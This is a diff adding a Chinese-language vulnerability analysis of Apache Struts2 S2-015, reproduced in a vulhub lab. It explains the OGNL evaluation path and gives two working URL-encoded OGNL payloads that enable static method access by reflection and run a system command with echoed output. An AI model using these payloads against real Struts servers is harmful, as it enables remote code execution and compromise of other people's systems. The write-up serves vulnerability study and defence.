@@ -753,11 +753,61 @@ https://cwiki.apache.org/confluence/display/WW/S2-013
 <a name="s2-015"></a>
 ## S2-015
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-015
+
+影响版本：`Struts 2.0.0` - `Struts 2.3.14.2`
+
 ## 漏洞复现与分析
 
+`S2-015`实际上包括两处漏洞：
+- **Wildcard matching**：通配符匹配导致的RCE
+- **Double evaluation of an expression**：OGNL表达式二次求值导致的RCE
+
+下面使用`vulhub/s2-015`对该漏洞进行进行调试分析。
+
+### vuln-1: Wildcard matching
+
+在`struts.xml`配置文件中定义了通配符`*`访问规则，如下图：
+
+<img src="pic/struts2_s2-015_1.png">
+
+假设请求的url中`action`名为`xxxx`，不匹配`param`，而是匹配通配符`*`，最终返回`/xxxx.jsp`页面，如果`xxxx.jsp`页面存在，则返回页面内容，如果不存在，则返回`404`报错页面，报错信息中包含有`/S2-015/xxxx.jsp`。
+
+而如果请求的`action`名是一个OGNL表达式，则会进行计算。最简单的PoC，传入一个`${2+3}.action`，会发现被进行OGNL表达式计算，然后结果回显在`404`报错页面中，如下图：
+
+<img src="pic/struts2_s2-015_2.png">
+
+从现象来看，OGNL表达式的计算也是在调度`Result`对象时发生的。因此，与`S2-012`一样，调试时可在`DefaultActionInvocation`开始调度`Result`对象时下断点，以及在OGNL表达式计算的关键方法比如`OgnlValueStack#findValue()`处下断点。
+
+调试过后发现，这个漏洞触发的方法调用栈，跟`S2-012`是几乎一样的(不同版本代码略有差异)。它会把`<result>`标签指定的页面地址作为参数，传入`TextParseUtil.translateVariables()`进行处理，最终会进入一个OGNL执行器`ParsedValueEvaluator`里进行OGNL表达式计算。
+
+<img src="pic/struts2_s2-015_3.png">
+
+<img src="pic/struts2_s2-015_4.png">
+
+### vuln-1 可回显PoC
+
+在Struts2 `2.3.14.2`版本的`SecurityMemberAccess`类中，删除了`setAllowStaticMethodAccess()`，所以我们在构造PoC的时候就不能通过`#_memberAccess['allowStaticMethodAccess']=true`的方式去获取调用静态方法的能力，但可以通过反射的方式去修改该属性。另外，还可以像前面`S2-001`里用过的，使用`ProcessBuilder#start()`方法来执行系统命令，因为这种方式不需要调用静态方法。
+
+这里使用反射修改`allowStaticMethodAccess`属性的方式，如下：
+```
+/S2-015/%25%7b%23m=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23a=@java.lang.Runtime@getRuntime().exec('id'),%23b=%23a.getInputStream(),%23c=new%20java.io.InputStreamReader(%23b),%23d=new%20java.io.BufferedReader(%23c),%23e=new%20char[50000],%23d.read(%23e),new%20java.lang.String(%23e)%7d.action
+```
+<img src="pic/struts2_s2-015_5.png">
+
+这里换一种方式来处理命令执行的结果：使用项目依赖包`commons-io`里的`IOUtils#toString()`方法。
+使用这个方法的好处是，它会根据命令执行结果而返回相应长度的字符串。而不是像上面的方式那样固定的缓冲区。
+```
+%25%7B%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23m=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())%7D.action
+```
+
+<img src="pic/struts2_s2-015_6.png">
+
+### vuln-2：Double evaluation of an expression
 
 
-### 可回显PoC
+
+### vuln-2 可回显PoC
 
 
 
